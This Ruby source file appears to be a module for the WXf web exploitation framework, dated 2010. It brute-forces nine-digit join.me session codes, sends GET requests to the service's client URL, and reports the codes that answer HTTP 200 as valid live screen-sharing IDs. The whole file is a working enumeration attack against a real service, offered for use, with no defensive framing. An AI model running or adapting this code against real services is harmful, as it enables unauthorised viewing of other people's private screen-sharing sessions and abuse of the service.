#!/usr/bin/env ruby
# 
# Created Oct 27 2010
#

class WebXploit < WXf::WXfmod_Factory::Auxiliary

  include WXf::WXfassists::General::MechReq

  
  def initialize
      super(
       'Name'        => 'https://join.me screen enumerator',
       'Version'     => '1.0',
       'Description' => %q{
        Enumerate valid IDs for current running join.me systems
                        },
       'References'  =>
        [
        
        ],
       'Author'      => [ 'KZWERG' ],
       'License'     => WXF_LICENSE
      )
      
      init_opts([
       OptString.new('UA', [true, "Specify a user agent to utilize", "1"]),
       OptInteger.new('START', [true, "Session to Start with 000000000 - 999999999" , 505607262]),
       OptInteger.new('LIMIT', [true, "Total attempts to run" , 2]),
       OptString.new('RURL', [true, "URL", "https://secure.join.me/Client/FlashClient.aspx?flashversion=10.1&code=" ])
      ])
      
  end
  

  def run
    
  start = datahash['START']
  limit = datahash['LIMIT']
  rurl = datahash['RURL']
    
  i=0
  
  while i < limit do
    code = sprintf("%09d",start + i)
    puts rurl + code
    res = send_request_cgi({
      'method' => 'GET',
      'RURL'   => rurl + code,
      'UA'     => datahash['UA'],
      'REDIRECT'   => 'false'
    })
    i += 1
    if (res) and (res.code == '200')
      puts "Valid ID: #{code}"
    end
  end
  
end



end
  
